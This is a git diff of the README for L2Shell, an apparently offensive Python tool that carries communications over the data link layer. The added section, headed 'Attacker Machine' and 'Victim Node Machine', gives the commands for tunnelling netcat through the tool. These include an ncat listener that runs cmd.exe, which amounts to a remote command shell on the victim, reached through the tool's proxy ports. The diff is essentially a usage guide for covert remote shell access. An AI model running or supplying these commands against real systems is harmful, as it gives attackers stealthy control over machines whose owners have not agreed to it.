@@ -2,7 +2,7 @@
 L2Shell is an opensource tool used for communications via data link layer.
 This script should work for both windows and linux systems.
 
-### Usage
+## L2Shell Usage
 ```
 python l2shell.py -h
 ```
@@ -41,6 +41,23 @@ python l2shell.py -l -d <delay> -a <attacker_id> -s <session_id>
 ```
 python l2shell.py -c -m <aa:aa:aa:aa:aa:aa> -a <attacker_id> -s <session_id>
 ```
+
+## L2Tunnel - Tunneling Netcat
+### Attacker Machine
+```
+python l2shell.py -c -a <attacker_id> -s <session_id> -p
+```
+```
+ncat.exe -lvnp 2223 -u -e cmd.exe
+```
+### Victim Node Machine
+```
+python l2shell.py -l -a <attacker_id> -s <session_id> -p
+```
+```
+ncat.exe 127.0.0.1 1111 --source-port 2223 -u
+```
+`note: The proxy option [-p] [--proxy] opens local ports 1111 and 2222`
 
 ### Requirements
 - pcap
